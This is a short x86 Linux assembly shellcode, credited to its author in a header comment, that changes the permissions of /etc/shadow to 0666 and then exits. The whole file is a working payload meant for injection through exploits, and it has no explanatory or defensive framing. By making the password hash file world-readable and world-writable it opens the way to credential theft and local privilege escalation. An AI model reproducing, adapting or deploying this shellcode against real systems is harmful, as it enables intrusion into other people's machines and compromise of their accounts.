#
# (linux/x86) chmod("/etc/shadow", 0666) + exit() - 32 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0xf
		popl %eax
		xorl %ecx, %ecx
		pushl %ecx
		movw $0666, %cx
		pushl $0x776f6461
		pushl $0x68732f63
		pushl $0x74652f2f
		movl %esp, %ebx
		int $0x80
		incl %eax
		int $0x80

